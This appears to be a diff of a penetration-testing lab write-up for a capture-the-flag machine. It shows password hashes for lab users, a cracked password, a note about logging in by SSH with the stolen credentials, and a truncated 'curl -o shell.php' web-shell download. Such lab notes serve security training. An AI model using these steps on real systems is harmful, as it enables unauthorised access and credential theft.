@@ -37,4 +37,12 @@ curl -o shell.php
 
 admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC (Jamie Thompson - admin@monitorstwo.htb)
 marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C (Marcus Brune - marcus@monitorstwo.htb)
+-> password : funkymonkey
 guest:43e9a4ab75570f5b
+
+
+we can use marcus's credentials and connect by SSH
+/usr/share/openssh/sshd_config
+/usr/share/keyrings
+/etc/skel/
+/etc/profile.d/
